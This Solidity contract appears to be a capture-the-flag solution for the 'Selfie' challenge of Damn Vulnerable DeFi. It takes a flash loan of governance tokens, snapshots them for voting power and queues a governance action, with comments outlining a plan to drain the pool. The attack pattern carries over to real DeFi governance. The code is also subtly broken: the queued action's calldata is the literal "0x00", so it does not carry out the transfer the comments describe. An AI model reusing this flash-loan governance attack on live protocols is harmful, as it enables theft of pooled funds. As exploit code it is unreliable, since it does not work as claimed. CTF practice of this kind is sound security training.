//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";




contract AttackSelfie is IERC3156FlashBorrower {
    /**
     * How ta pass this level:
     * 1. Make a flash loan for the tokens 
     * 2. Make a proposol to transfer the funds to me
     * 3. Advance time and execute the proposal
     * 4. Pass the challenge
     * 
     * Flash loans really are double edged swords. Really cool...
     */

    DamnValuableTokenSnapshot public immutable poolToken;
    IERC3156FlashLender public immutable pool;
    SimpleGovernance public immutable governance;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");


    constructor (IERC3156FlashLender _pool, DamnValuableTokenSnapshot _poolToken, SimpleGovernance _governance) {
        pool =  _pool;
        poolToken = _poolToken;
        governance = _governance;
    }

    function start () external {
        pool.flashLoan(IERC3156FlashBorrower(this), address(poolToken), 1500000 ether, "0x00");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        // the pool will call this function and now we have the tokens
        // now we make the proposal
        // and return the tokens to the pool

        // 1. Take a snapshot with the new balance thet we just got from the flash loan
        poolToken.snapshot();

        // 2. Make a proposal to SimpleGovernance
        governance.queueAction(address(pool), 0, "0x00");

        //3. Pay back to the pool:
        poolToken.approve(address(pool), 1500000 ether);

        return CALLBACK_SUCCESS;
    }





}